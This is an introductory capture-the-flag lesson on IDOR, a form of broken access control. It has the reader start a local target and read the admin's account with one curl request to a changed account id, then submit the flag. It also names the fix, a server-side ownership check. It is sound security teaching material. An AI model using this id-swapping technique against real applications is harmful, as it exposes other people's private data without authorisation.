# Room: AppSec — capture a real flag

**Topic:** application security (OWASP) · **Difficulty:** intro

## The story

Time to exploit a real vulnerability and capture a flag, the way security people
practise everywhere. You will exploit **broken access control** (IDOR) — the
single most common serious web flaw.

## Theory (1 minute)

**IDOR** (Insecure Direct Object Reference): an app returns an object by id
without checking you are allowed to see it. Change the id, see someone else's
data. The fix is a server-side ownership check.

## What you will actually do (in your terminal)

Start the CTF target (leave it running):

```bash
cd ctf-lab
python3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt
python3 target/run_target.py
```

In a second terminal, read the admin's account (you are not the admin):

```bash
curl -s http://127.0.0.1:5000/api/account/3
```

The response has a `secret_note` field containing a `FLAG{...}`.

## Your task

Paste the exact flag you captured.

```bash
python3 rooms.py submit appsec FLAG{...}
```

## Going further

The full 8-flag CTF is in `ctf-lab/` (`python3 ctf.py list`), and the complete
OWASP Top 10 attack+fix set is in `appsec-lab/`.
